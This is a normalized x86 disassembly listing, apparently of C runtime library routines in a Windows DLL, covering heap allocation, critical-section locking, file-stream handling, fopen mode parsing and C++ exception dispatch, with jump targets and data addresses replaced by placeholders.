and edx [ ebp - 0x8 ]
and esi [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
inc [ ebp - 0x4 ]
and edx [ ebp - 0x8 ]
add ecx 0x4
mov edi esi
and edi [ ecx ]
or edx edi
je r-xdata
mov ecx edx
xor edi edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
and ecx esi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jae r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
test ecx ecx
jl r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
push 0x20
and ecx [ ebp - 0x8 ]
pop edi
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
mov [ ebp - 0x8 ] ecx
sar esi 0x4
dec esi
cmp esi 0x3f
jle r-xdata
shl ecx 0x1
inc edi
jmp r-xdata
push ebx
call sub_100071cd
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
cmp ebx [ ebp - 0x4 ]
add ebx 0x14
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
xor eax eax
jmp r-xdata
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1000711c
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
cmp ebx eax
add ebx 0x14
jmp r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
cmp [ ebp - 0x8 ] 0x0
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
jge r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ edx + 0x4 ] edi
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xb ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_1000711c
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_100071cd
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_100072c8
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_100075be
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_10008e74
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_10008e74
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor ecx ecx
mov edx rw-data
push 0x1a
call sub_100047cc
pop ecx
or [ edx ] 0xffffffff
test eax eax
jne r-xdata
mov esi ecx
mov eax ecx
sar esi 0x5
and eax 0x1f
mov esi [ esi * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
mov eax [ esi + eax * 4 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add edx 0x20
inc ecx
cmp edx rw-data
jl r-xdata
sub_1000767a
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_10006a09
pop ecx
retn
sub_100076a9
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_10006a09
pop ecx
retn
sub_100076cc
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x1c
push eax
call sub_10006a6a
pop ecx
retn
sub_100076fb
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x1c
push eax
call sub_10006a6a
pop ecx
retn
sub_1000771e
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
jae r-xdata
call sub_10004f88
mov [ eax ] 0x9
call sub_10004f91
and [ eax ] 0x0
or eax 0xffffffff
pop esi
retn
mov ecx esi
mov eax esi
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
test [ ecx + eax * 4 + 0x4 ] 0x1
je r-xdata
push edi
push esi
call sub_1000a5c6
push esi
call sub_1000777b
push esi
mov edi eax
call sub_1000a625
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_1000777b
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_1000a584
cmp eax 0xffffffff
pop ecx
je r-xdata
xor edi edi
cmp esi 0x1
je r-xdata
xor eax eax
push edi
call sub_10004f15
pop ecx
or eax 0xffffffff
jmp r-xdata
push 0x2
call sub_1000a584
push 0x1
mov edi eax
call sub_1000a584
pop ecx
cmp eax edi
pop ecx
je r-xdata
cmp esi 0x2
jne r-xdata
pop edi
pop esi
retn
push esi
call sub_1000a584
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_1000a505
mov eax esi
and esi 0x1f
sar eax 0x5
pop ecx
mov eax [ eax * 4 + rw-data ]
lea ecx [ esi + esi * 8 ]
and [ eax + ecx * 4 + 0x4 ] 0x0
test edi edi
je r-xdata
sub_100077fe
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_1000413e
and [ esi + 0xc ] 0xfbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10007829
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push edi
push esi
call sub_1000767a
push esi
call sub_10007858
push esi
mov edi eax
call sub_100076cc
add esp 0xc
mov eax edi
pop edi
pop esi
retn
push esi
call sub_100078eb
pop ecx
pop esi
retn
sub_10007858
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_10007886
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_1000a647
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_10007886
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_10009ed8
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_100078eb
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_10006a09
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_10006a6a
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_100076a9
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_100076fb
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_10007858
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_10007858
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_1000798f
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov edi [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
mov al [ edi ]
cmp al 0x61
je r-xdata
mov ecx 0x109
cmp al 0x72
je r-xdata
push 0x1a4
push [ ebp + 0x10 ]
push ecx
push [ ebp + 0x8 ]
call sub_1000a6da
mov ecx eax
add esp 0x10
cmp ecx ebx
jge r-xdata
cmp edx ebx
je r-xdata
xor ecx ecx
or esi 0x1
jmp r-xdata
cmp al 0x77
jne r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov [ eax + 0xc ] esi
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x1c ] ebx
mov [ eax + 0x10 ] ecx
xor eax eax
jmp r-xdata
movsx eax al
cmp eax 0x54
jg r-xdata
push 0x1
pop edx
mov ecx 0x301
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub eax 0x62
je r-xdata
je r-xdata
or esi 0x2
test ch 0xc0
je r-xdata
dec eax
je r-xdata
mov eax 0x1000
test eax ecx
jne r-xdata
sub eax 0x2b
je r-xdata
or ch 0x80
jmp r-xdata
xor edx edx
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0xb
je r-xdata
or ecx eax
jmp r-xdata
test cl 0x2
jne r-xdata
sub eax 0x19
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
je r-xdata
mov [ ebp - 0x8 ] 0x1
or esi 0x4000
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
sub eax 0x6
jne r-xdata
and ecx 0xfffffffe
and esi 0xfffffffc
or ecx 0x2
or esi 0x80
jmp r-xdata
test cl 0x40
jne r-xdata
sub eax 0xe
je r-xdata
mov [ ebp - 0x8 ] 0x1
and esi 0xffffbfff
jmp r-xdata
test ch 0xc0
jne r-xdata
or ecx 0x40
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
dec eax
jne r-xdata
or ch 0x40
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov [ ebp - 0x4 ] 0x1
or ecx 0x20
jmp r-xdata
sub_10007aff
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_10006a09
xor esi esi
cmp [ rw-data ] ebx
pop ecx
jle r-xdata
push 0x2
call sub_10006a6a
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
cmp eax ebx
je r-xdata
push 0x38
shl esi 0x2
call sub_100049d2
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
mov eax [ esi + eax ]
cmp eax ebx
je r-xdata
test [ eax + 0xc ] 0x83
jne r-xdata
add eax 0x20
push eax
call [ InitializeCriticalSection@IAT ]
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
inc esi
cmp esi [ rw-data ]
jl r-xdata
push eax
push esi
call sub_100076a9
pop ecx
pop ecx
mov ecx [ rw-data ]
mov eax [ ecx + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
or [ edi + 0x10 ] 0xffffffff
mov [ edi + 0x4 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
jmp r-xdata
mov edi [ ecx + esi * 4 ]
jmp r-xdata
push eax
push esi
call sub_100076fb
pop ecx
pop ecx
cmp edi ebx
je r-xdata
sub_10007bc7
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi 0x19930520
cmp [ esi ] edi
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
je r-xdata
call sub_1000848d
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
push 0x1
pop eax
cmp [ eax ] 0xe06d7363
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10007c62
add esp 0x20
cmp [ eax + 0x14 ] edi
jbe r-xdata
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10007f1c
add esp 0x10
jmp r-xdata
mov ecx [ eax + 0x1c ]
mov ecx [ ecx + 0x8 ]
test ecx ecx
je r-xdata
movzx edx [ ebp + 0x24 ]
push edx
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call ecx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_10007c62
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov eax [ eax + 0x8 ]
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jl r-xdata
call sub_1000848d
mov ecx [ ebp + 0x18 ]
cmp eax [ ecx + 0x4 ]
jl r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx 0xe06d7363
push edi
mov edi 0x19930520
cmp [ esi ] ebx
jne r-xdata
jmp sub_1000842c
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10007e15
add esp 0x20
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp [ esi + 0x14 ] edi
jne r-xdata
call sub_100067bc
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov edi [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
call sub_100044eb
add esp 0x14
mov ebx eax
call sub_100067bc
mov esi [ eax + 0x6c ]
call sub_100067bc
mov eax [ eax + 0x70 ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x14 ] 0x1
call sub_1000a9a9
pop ecx
test eax eax
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
cmp [ ebx ] edi
jg r-xdata
cmp [ esi ] ebx
jne r-xdata
call sub_1000848d
push 0x1
push esi
call sub_10008354
pop ecx
pop ecx
inc [ ebp - 0x4 ]
add ebx 0x14
jmp r-xdata
cmp edi [ ebx + 0x4 ]
jg r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x18 ]
jae r-xdata
mov eax [ ebx + 0x10 ]
